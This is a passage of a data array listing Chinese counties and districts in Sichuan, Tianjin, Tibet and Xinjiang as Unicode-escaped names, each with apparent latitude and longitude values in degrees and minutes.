"4", "102", "59"], ["\u56DB\u5DDD\u7701", "\u677E\u6F58\u53BF", "32", "38", "103", "36"], ["\u56DB\u5DDD\u7701", "\u5317\u5DDD\u7F8C\u65CF\u81EA\u6CBB\u53BF", "31", "49", "104", "27"], ["\u56DB\u5DDD\u7701", "\u5E73\u6B66\u53BF", "32", "25", "104", "32"], ["\u56DB\u5DDD\u7701", "\u5251\u9601\u53BF", "32", "17", "105", "31"], ["\u56DB\u5DDD\u7701", "\u4E5D\u5BE8\u6C9F\u53BF", "33", "16", "104", "14"], ["\u56DB\u5DDD\u7701", "\u65FA\u82CD\u53BF", "32", "14", "106", "17"], ["\u56DB\u5DDD\u7701", "\u82CD\u6EAA\u53BF", "31", "44", "105", "56"], ["\u56DB\u5DDD\u7701", "\u5357\u6C5F\u53BF", "32", "21", "106", "50"], ["\u56DB\u5DDD\u7701", "\u901A\u6C5F\u53BF", "31", "55", "107", "14"], ["\u56DB\u5DDD\u7701", "\u8FBE\u53BF", "31", "12", "107", "30"], ["\u56DB\u5DDD\u7701", "\u5BA3\u6C49\u53BF", "31", "21", "107", "43"], ["\u56DB\u5DDD\u7701", "\u5F00\u6C5F\u53BF", "31", "5", "107", "52"], ["\u56DB\u5DDD\u7701", "\u897F\u5145\u53BF", "30", "60", "105", "53"], ["\u56DB\u5DDD\u7701", "\u5CB3\u6C60\u53BF", "30", "33", "106", "26"], ["\u56DB\u5DDD\u7701", "\u6B66\u80DC\u53BF", "30", "21", "106", "17"], ["\u56DB\u5DDD\u7701", "\u90BB\u6C34\u53BF", "30", "20", "106", "56"], ["\u56DB\u5DDD\u7701", "\u5927\u7AF9\u53BF", "30", "44", "107", "12"], ["\u56DB\u5DDD\u7701", "\u6E20\u53BF", "30", "50", "106", "58"], ["\u56DB\u5DDD\u7701", "\u8425\u5C71\u53BF", "31", "5", "106", "34"], ["\u56DB\u5DDD\u7701", "\u5E73\u660C\u53BF", "31", "34", "107", "6"], ["\u56DB\u5DDD\u7701", "\u84EC\u5B89\u53BF", "31", "2", "106", "25"], ["\u56DB\u5DDD\u7701", "\u4EEA\u9647\u53BF", "31", "16", "106", "17"], ["\u56DB\u5DDD\u7701", "\u5357\u90E8\u53BF", "31", "21", "106", "4"], ["\u56DB\u5DDD\u7701", "\u6893\u6F7C\u53BF", "31", "38", "105", "10"], ["\u56DB\u5DDD\u7701", "\u76D0\u4EAD\u53BF", "31", "13", "105", "23"], ["\u56DB\u5DDD\u7701", "\u84EC\u6EAA\u53BF", "30", "47", "105", "43"], ["\u56DB\u5DDD\u7701", "\u5927\u82F1\u53BF", "30", "35", "105", "15"], ["\u56DB\u5DDD\u7701", "\u5C04\u6D2A\u53BF", "30", "52", "105", "23"], ["\u56DB\u5DDD\u7701", "\u91D1\u5802\u53BF", "30", "51", "104", "26"], ["\u56DB\u5DDD\u7701", "\u7F57\u6C5F\u53BF", "31", "19", "104", "30"], ["\u56DB\u5DDD\u7701", "\u4E2D\u6C5F\u53BF", "31", "2", "104", "41"], ["\u56DB\u5DDD\u7701", "\u4E09\u53F0\u53BF", "31", "6", "105", "5"], ["\u56DB\u5DDD\u7701", "\u5B89\u53BF", "31", "32", "104", "34"], ["\u56DB\u5DDD\u7701", "\u8302\u53BF", "31", "41", "103", "51"], ["\u56DB\u5DDD\u7701", "\u6C76\u5DDD\u53BF", "31", "29", "103", "35"], ["\u56DB\u5DDD\u7701", "\u7406\u53BF", "31", "26", "103", "10"], ["\u56DB\u5DDD\u7701", "\u5927\u9091\u53BF", "30", "35", "103", "31"], ["\u56DB\u5DDD\u7701", "\u65B0\u6D25\u53BF", "30", "25", "103", "49"], ["\u56DB\u5DDD\u7701", "\u53CC\u6D41\u53BF", "30", "35", "103", "55"], ["\u56DB\u5DDD\u7701", "\u90EB\u53BF", "30", "49", "103", "53"], ["\u56DB\u5DDD\u7701", "\u4EC1\u5BFF\u53BF", "29", "60", "104", "9"], ["\u56DB\u5DDD\u7701", "\u4E95\u7814\u53BF", "29", "39", "104", "4"], ["\u56DB\u5DDD\u7701", "\u9752\u795E\u53BF", "29", "50", "103", "51"], ["\u56DB\u5DDD\u7701", "\u5F6D\u5C71\u53BF", "30", "12", "103", "52"], ["\u56DB\u5DDD\u7701", "\u84B2\u6C5F\u53BF", "30", "12", "103", "30"], ["\u56DB\u5DDD\u7701", "\u540D\u5C71\u53BF", "30", "5", "103", "7"], ["\u56DB\u5DDD\u7701", "\u6D2A\u96C5\u53BF", "29", "55", "103", "22"], ["\u56DB\u5DDD\u7701", "\u4E39\u68F1\u53BF", "30", "1", "103", "31"], ["\u56DB\u5DDD\u7701", "\u5939\u6C5F\u53BF", "29", "44", "103", "34"], ["\u56DB\u5DDD\u7701", "\u5CE8\u8FB9\u5F5D\u65CF\u81EA\u6CBB\u53BF", "29", "14", "103", "16"], ["\u56DB\u5DDD\u7701", "\u6C90\u5DDD\u53BF", "28", "58", "103", "54"], ["\u56DB\u5DDD\u7701", "\u728D\u4E3A\u53BF", "29", "13", "103", "57"], ["\u56DB\u5DDD\u7701", "\u5BCC\u987A\u53BF", "29", "11", "104", "59"], ["\u56DB\u5DDD\u7701", "\u5A01\u8FDC\u53BF", "29", "32", "104", "40"], ["\u56DB\u5DDD\u7701", "\u8363\u53BF", "29", "28", "104", "25"], ["\u56DB\u5DDD\u7701", "\u8D44\u4E2D\u53BF", "29", "47", "104", "51"], ["\u56DB\u5DDD\u7701", "\u4E50\u81F3\u53BF", "30", "17", "105", "1"], ["\u56DB\u5DDD\u7701", "\u5B89\u5CB3\u53BF", "30", "6", "105", "20"], ["\u56DB\u5DDD\u7701", "\u6CF8\u53BF", "29", "9", "105", "23"], ["\u56DB\u5DDD\u7701", "\u9686\u660C\u53BF", "29", "21", "105", "17"], ["\u56DB\u5DDD\u7701", "\u5174\u6587\u53BF", "28", "18", "105", "14"], ["\u56DB\u5DDD\u7701", "\u53D9\u6C38\u53BF", "28", "10", "105", "26"], ["\u56DB\u5DDD\u7701", "\u7B60\u8FDE\u53BF", "28", "10", "104", "31"], ["\u56DB\u5DDD\u7701", "\u9AD8\u53BF", "28", "26", "104", "31"], ["\u56DB\u5DDD\u7701", "\u73D9\u53BF", "28", "27", "104", "43"], ["\u56DB\u5DDD\u7701", "\u957F\u5B81\u53BF", "28", "35", "104", "55"], ["\u56DB\u5DDD\u7701", "\u6C5F\u5B89\u53BF", "28", "44", "105", "4"], ["\u56DB\u5DDD\u7701", "\u5357\u6EAA\u53BF", "28", "51", "104", "59"], ["\u56DB\u5DDD\u7701", "\u5B9C\u5BBE\u53BF", "28", "42", "104", "33"], ["\u56DB\u5DDD\u7701", "\u53E4\u853A\u53BF", "28", "3", "105", "49"], ["\u56DB\u5DDD\u7701", "\u5408\u6C5F\u53BF", "28", "49", "105", "50"], ["\u56DB\u5DDD\u7701", "\u7F8E\u59D1\u53BF", "28", "20", "103", "8"], ["\u56DB\u5DDD\u7701", "\u96F7\u6CE2\u53BF", "28", "16", "103", "34"], ["\u56DB\u5DDD\u7701", "\u91D1\u9633\u53BF", "27", "42", "103", "15"], ["\u56DB\u5DDD\u7701", "\u9A6C\u8FB9\u5F5D\u65CF\u81EA\u6CBB\u53BF", "28", "50", "103", "33"], ["\u5929\u6D25\u5E02", "\u5929\u6D25\u5E02", "39", "7", "117", "12"], ["\u5929\u6D25\u5E02", "\u6EE8\u6D77\u65B0\u533A", "39", "2", "117", "41"], ["\u5929\u6D25\u5E02", "\u897F\u9752\u533A", "39", "8", "117", "0"], ["\u5929\u6D25\u5E02", "\u6CB3\u897F\u533A", "39", "7", "117", "13"], ["\u5929\u6D25\u5E02", "\u5357\u5F00\u533A", "39", "8", "117", "9"], ["\u5929\u6D25\u5E02", "\u7EA2\u6865\u533A", "39", "10", "117", "9"], ["\u5929\u6D25\u5E02", "\u5317\u8FB0\u533A", "39", "13", "117", "8"], ["\u5929\u6D25\u5E02", "\u6CB3\u5317\u533A", "39", "9", "117", "11"], ["\u5929\u6D25\u5E02", "\u548C\u5E73\u533A", "39", "7", "117", "12"], ["\u5929\u6D25\u5E02", "\u6CB3\u4E1C\u533A", "39", "7", "117", "13"], ["\u5929\u6D25\u5E02", "\u4E1C\u4E3D\u533A", "39", "5", "117", "18"], ["\u5929\u6D25\u5E02", "\u6D25\u5357\u533A", "38", "59", "117", "23"], ["\u5929\u6D25\u5E02", "\u5927\u6E2F\u533A", "38", "50", "117", "27"], ["\u5929\u6D25\u5E02", "\u6C49\u6CBD\u533A", "39", "15", "117", "48"], ["\u5929\u6D25\u5E02", "\u5858\u6CBD\u533A", "39", "1", "117", "39"], ["\u5929\u6D25\u5E02", "\u5B9D\u577B\u533A", "39", "43", "117", "18"], ["\u5929\u6D25\u5E02", "\u6B66\u6E05\u533A", "39", "23", "117", "2"], ["\u5929\u6D25\u5E02", "\u9759\u6D77\u53BF", "38", "56", "116", "55"], ["\u5929\u6D25\u5E02", "\u5B81\u6CB3\u53BF", "39", "20", "117", "49"], ["\u5929\u6D25\u5E02", "\u84DF\u53BF", "40", "3", "117", "24"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u62C9\u8428\u5E02", "29", "39", "91", "8"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u963F\u91CC\u5730\u533A", "32", "30", "80", "6"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u65E5\u5580\u5219\u5730\u533A", "29", "16", "88", "53"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6797\u829D\u5730\u533A", "29", "41", "94", "22"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u90A3\u66F2\u5730\u533A", "31", "29", "92", "4"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5C71\u5357\u5730\u533A", "29", "14", "91", "46"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u660C\u90FD\u5730\u533A", "31", "8", "97", "11"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u53CC\u6E56\u7279\u522B\u533A", "33", "12", "88", "50"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u65E5\u5580\u5219\u5E02", "29", "16", "88", "53"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u57CE\u5173\u533A", "29", "39", "91", "8"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u672D\u8FBE\u53BF", "31", "29", "79", "48"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u9769\u5409\u53BF", "32", "24", "81", "7"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u666E\u5170\u53BF", "30", "18", "81", "10"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8428\u560E\u53BF", "29", "20", "85", "14"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5409\u9686\u53BF", "28", "51", "85", "18"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8042\u62C9\u6728\u53BF", "28", "10", "85", "59"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u4E9A\u4E1C\u53BF", "27", "29", "88", "54"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u767D\u6717\u53BF", "29", "7", "89", "16"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6C5F\u5B5C\u53BF", "28", "55", "89", "36"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5357\u6728\u6797\u53BF", "29", "41", "89", "6"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8C22\u901A\u95E8\u53BF", "29", "26", "88", "16"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u62C9\u5B5C\u53BF", "29", "5", "87", "38"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8428\u8FE6\u53BF", "28", "54", "88", "1"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5C97\u5DF4\u53BF", "28", "17", "88", "31"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5B9A\u7ED3\u53BF", "28", "22", "87", "46"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5B9A\u65E5\u53BF", "28", "40", "87", "7"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6602\u4EC1\u53BF", "29", "18", "87", "14"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u7533\u624E\u53BF", "30", "56", "88", "42"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5C3C\u739B\u53BF", "31", "47", "87", "14"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u63AA\u52E4\u53BF", "31", "1", "85", "10"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u4EF2\u5DF4\u53BF", "29", "46", "84", "2"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6539\u5219\u53BF", "32", "18", "84", "4"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5676\u5C14\u53BF", "32", "30", "80", "6"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u65E5\u571F\u53BF", "33", "23", "79", "43"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8FB9\u575D\u53BF", "30", "56", "94", "42"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5DE5\u5E03\u6C5F\u8FBE\u53BF", "29", "53", "93", "15"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5609\u9ECE\u53BF", "30", "39", "93", "15"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6BD4\u5982\u53BF", "31", "29", "93", "41"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5DF4\u9752\u53BF", "31", "56", "94", "2"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u7D22\u53BF", "31", "53", "93", "47"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8042\u8363\u53BF", "32", "7", "92", "18"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u90A3\u66F2\u53BF", "31", "29", "92", "4"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5B89\u591A\u53BF", "32", "16", "91", "41"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u73ED\u6208\u53BF", "31", "22", "90", "1"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5806\u9F99\u5FB7\u5E86\u53BF", "29", "39", "90", "60"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5F53\u96C4\u53BF", "30", "29", "91", "6"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5C3C\u6728\u53BF", "29", "27", "90", "9"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8FBE\u5B5C\u53BF", "29", "41", "91", "21"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6797\u5468\u53BF", "29", "54", "91", "15"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u58A8\u7AF9\u5DE5\u5361\u53BF", "29", "50", "91", "44"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u4E43\u4E1C\u53BF", "29", "14", "91", "46"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6851\u65E5\u53BF", "29", "16", "92", "1"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u66F2\u677E\u53BF", "29", "4", "92", "12"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u743C\u7ED3\u53BF", "29", "2", "91", "41"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u9519\u90A3\u53BF", "27", "60", "91", "57"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u63AA\u7F8E\u53BF", "28", "26", "91", "26"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u624E\u56CA\u53BF", "29", "15", "91", "20"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6D1B\u624E\u53BF", "28", "23", "90", "52"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u66F2\u6C34\u53BF", "29", "22", "90", "44"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8D21\u560E\u53BF", "29", "18", "90", "59"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6D6A\u5361\u5B50\u53BF", "28", "58", "90", "24"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u4EC1\u5E03\u53BF", "29", "14", "89", "50"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5EB7\u9A6C\u53BF", "28", "34", "89", "41"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u52A0\u67E5\u53BF", "29", "9", "92", "35"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u9686\u5B50\u53BF", "28", "25", "92", "28"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6717\u53BF", "29", "3", "93", "4"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u7C73\u6797\u53BF", "29", "13", "94", "13"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6797\u829D\u53BF", "29", "41", "94", "22"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5BDF\u9685\u53BF", "28", "40", "97", "28"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u58A8\u8131\u53BF", "29", "20", "95", "20"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6CE2\u5BC6\u53BF", "29", "52", "95", "46"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6D1B\u9686\u53BF", "30", "45", "95", "50"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8D21\u89C9\u53BF", "30", "52", "98", "16"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u6C5F\u8FBE\u53BF", "31", "30", "98", "13"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u8292\u5EB7\u53BF", "29", "41", "98", "36"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u7C7B\u4E4C\u9F50\u53BF", "31", "13", "96", "36"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5DE6\u8D21\u53BF", "29", "40", "97", "51"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u4E01\u9752\u53BF", "31", "25", "95", "36"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u660C\u90FD\u53BF", "31", "8", "97", "11"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u516B\u5BBF\u53BF", "30", "3", "96", "55"], ["\u897F\u85CF\u81EA\u6CBB\u533A", "\u5BDF\u96C5\u53BF", "30", "39", "97", "34"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E4C\u9C81\u6728\u9F50\u5E02", "43", "49", "87", "37"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u514B\u5B5C\u52D2\u82CF\u67EF\u5C14\u514B\u5B5C\u81EA\u6CBB\u5DDE", "39", "43", "76", "10"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5580\u4EC0\u5730\u533A", "39", "28", "75", "59"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u514B\u82CF\u5730\u533A", "41", "10", "80", "16"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4F0A\u7281\u54C8\u8428\u514B\u81EA\u6CBB\u5DDE", "43", "55", "81", "19"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u535A\u5C14\u5854\u62C9\u8499\u53E4\u81EA\u6CBB\u5DDE", "44", "54", "82", "4"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u548C\u7530\u5730\u533A", "37", "7", "79", "55"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u54C8\u5BC6\u5730\u533A", "42", "50", "93", "31"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5410\u9C81\u756A\u5730\u533A", "42", "57", "89", "10"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5DF4\u97F3\u90ED\u695E\u8499\u53E4\u81EA\u6CBB\u5DDE", "41", "46", "86", "9"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u660C\u5409\u56DE\u65CF\u81EA\u6CBB\u5DDE", "44", "1", "87", "18"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u514B\u62C9\u739B\u4F9D\u5E02", "45", "36", "84", "52"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5854\u57CE\u5730\u533A", "46", "45", "82", "59"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u52D2\u6CF0\u5730\u533A", "47", "51", "88", "8"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6C34\u78E8\u6C9F\u533A", "43", "50", "87", "38"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u65B0\u5E02\u533A", "43", "51", "87", "36"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5934\u5C6F\u6CB3\u533A", "43", "52", "87", "25"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E1C\u5C71\u533A", "43", "57", "87", "41"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u7C73\u6CC9\u5E02", "43", "58", "87", "39"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u514B\u62C9\u739B\u4F9D\u533A", "45", "36", "84", "52"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u72EC\u5C71\u5B50\u533A", "44", "19", "84", "51"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u56FE\u4EC0\u5E02", "39", "43", "76", "10"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5580\u4EC0\u5E02", "39", "28", "75", "59"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u514B\u82CF\u5E02", "41", "10", "80", "16"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u62C9\u5C14\u5E02", "40", "33", "81", "17"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4F0A\u5B81\u5E02", "43", "55", "81", "19"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u535A\u4E50\u5E02", "44", "54", "82", "4"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u56FE\u6728\u8212\u514B\u5E02", "39", "51", "79", "8"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u548C\u7530\u5E02", "37", "7", "79", "55"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u54C8\u5BC6\u5E02", "42", "50", "93", "31"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E94\u5BB6\u6E20\u5E02", "44", "10", "87", "32"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u961C\u5EB7\u5E02", "44", "9", "87", "59"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5410\u9C81\u756A\u5E02", "42", "57", "89", "10"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5E93\u5C14\u52D2\u5E02", "41", "46", "86", "9"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u660C\u5409\u5E02", "44", "1", "87", "18"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u77F3\u6CB3\u5B50\u5E02", "44", "18", "86", "2"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u594E\u5C6F\u5E02", "44", "25", "84", "54"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E4C\u82CF\u5E02", "44", "26", "84", "41"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5854\u57CE\u5E02", "46", "45", "82", "59"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u52D2\u6CF0\u5E02", "47", "51", "88", "8"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E4C\u5C14\u79BE\u533A", "46", "5", "85", "41"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u767D\u78B1\u6EE9\u533A", "45", "42", "85", "8"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u76AE\u5C71\u53BF", "37", "37", "78", "17"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u838E\u8F66\u53BF", "38", "25", "77", "14"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6CFD\u666E\u53BF", "38", "11", "77", "16"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u53F6\u57CE\u53BF", "37", "53", "77", "25"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u9EA6\u76D6\u63D0\u53BF", "38", "54", "77", "39"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5DF4\u695A\u53BF", "39", "47", "78", "33"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5CB3\u666E\u6E56\u53BF", "39", "14", "76", "46"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u758F\u52D2\u53BF", "39", "24", "76", "3"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u758F\u9644\u53BF", "39", "23", "75", "51"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E4C\u6070\u53BF", "39", "43", "75", "15"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u514B\u9676\u53BF", "39", "9", "75", "57"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u82F1\u5409\u6C99\u53BF", "38", "56", "76", "10"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5854\u4EC0\u5E93\u5C14\u5E72\u5854\u5409\u514B\u81EA\u6CBB\u53BF", "37", "47", "75", "14"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4F3D\u5E08\u53BF", "39", "30", "76", "44"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u5408\u5947\u53BF", "40", "56", "78", "27"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u67EF\u576A\u53BF", "40", "30", "79", "3"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4E4C\u4EC0\u53BF", "41", "13", "79", "14"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6E29\u5BBF\u53BF", "41", "17", "80", "14"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u963F\u74E6\u63D0\u53BF", "40", "38", "80", "23"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u6E29\u6CC9\u53BF", "44", "58", "81", "2"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u970D\u57CE\u53BF", "44", "3", "80", "53"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u4F0A\u5B81\u53BF", "43", "59", "81", "31"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5BDF\u5E03\u67E5\u5C14\u9521\u4F2F\u81EA\u6CBB\u53BF", "43", "50", "81", "9"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u662D\u82CF\u53BF", "43", "9", "81", "8"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u7279\u514B\u65AF\u53BF", "43", "13", "81", "50"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5DE9\u7559\u53BF", "43", "29", "82", "14"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u65B0\u6E90\u53BF", "43", "26", "83", "15"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5C3C\u52D2\u514B\u53BF", "43", "47", "82", "30"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u7CBE\u6CB3\u53BF", "44", "36", "82", "53"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u8F6E\u53F0\u53BF", "41", "47", "84", "16"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u62DC\u57CE\u53BF", "41", "48", "81", "52"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u65B0\u548C\u53BF", "41", "33", "82", "36"], ["\u65B0\u7586\u7EF4\u543E\u5C14\u81EA\u6CBB\u533A", "\u5E93\u8F66\u53BF", "41", 